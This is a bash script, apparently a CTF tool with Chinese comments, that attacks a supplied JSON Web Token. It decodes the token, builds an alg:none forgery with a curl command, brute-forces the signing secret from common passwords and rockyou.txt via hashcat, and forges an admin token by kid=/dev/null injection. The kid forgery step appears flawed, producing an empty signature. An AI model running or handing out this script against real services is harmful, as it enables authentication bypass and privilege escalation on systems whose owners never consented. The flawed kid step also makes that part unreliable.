#!/bin/bash
# CTF JWT攻击
# 用法: bash jwt.sh <TOKEN>

TOKEN="${1:?用法: bash jwt.sh <JWT_TOKEN>}"

echo "=========================================="
echo "  JWT攻击: $(echo $TOKEN | cut -c1-50)..."
echo "=========================================="

# 解码
echo -e "\n[1/5] JWT解码"
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | /usr/bin/python3 -m json.tool 2>/dev/null && echo "---HEADER---"
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | /usr/bin/python3 -m json.tool 2>/dev/null && echo "---PAYLOAD---"

# alg:none
echo -e "\n[2/5] alg:none绕过"
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
echo "  none攻击: $HEADER.$PAYLOAD."
echo "  curl -H 'Authorization: Bearer $HEADER.$PAYLOAD.' URL"

# 密钥爆破
echo -e "\n[3/5] 密钥爆破 (常见密钥)"
COMMON_SECRETS=("secret" "password" "123456" "admin" "key" "jwt_secret" "mysecret" "supersecret" "changeme" "default" "test" "qwerty" "abc123" "your-256-bit-secret")
for secret in "${COMMON_SECRETS[@]}"; do
    # 用python验证
    valid=$(/usr/bin/python3 -c "
import hmac, hashlib, base64, sys
token = sys.argv[1]
secret = sys.argv[2]
header_payload = '.'.join(token.split('.')[:2])
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
expected = token.split('.')[2].replace('-','+').replace('_','/')
# pad
expected += '=' * (4 - len(expected) % 4)
actual_sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print('VALID' if actual_sig == token.split('.')[2] else 'INVALID')
" "$TOKEN" "$secret" 2>/dev/null)
    if [ "$valid" == "VALID" ]; then
        echo -e "  \033[31m[!] 密钥找到: $secret\033[0m"
        echo "  伪造: flask-unsign --sign --cookie \"{'role':'admin'}\" --secret '$secret'"
        break
    fi
done

# hashcat
echo -e "\n[4/5] hashcat爆破 (如果rockyou.txt存在)"
if [ -f /usr/share/wordlists/rockyou.txt ]; then
    echo "$TOKEN" > /tmp/jwt_token.txt
    hashcat -m 16500 /tmp/jwt_token.txt /usr/share/wordlists/rockyou.txt --force 2>&1 | tail -5
else
    echo "  rockyou.txt不存在,跳过"
fi

# kid注入
echo -e "\n[5/5] kid注入检测"
echo '  kid=/dev/null: Header {"alg":"HS256","kid":"/dev/null","typ":"JWT"}'
echo '  kid=/dev/null → 签名变为空 → 可伪造任意payload'
/usr/bin/python3 -c "
import base64, json, sys
payload = json.loads(base64.urlsafe_b64decode(sys.argv[1].split('.')[1] + '=='))
payload['role'] = 'admin'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'伪造admin: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.{new_payload}.')
" "$TOKEN" 2>/dev/null

echo -e "\n=========================================="
echo "JWT攻击完成"
echo "=========================================="
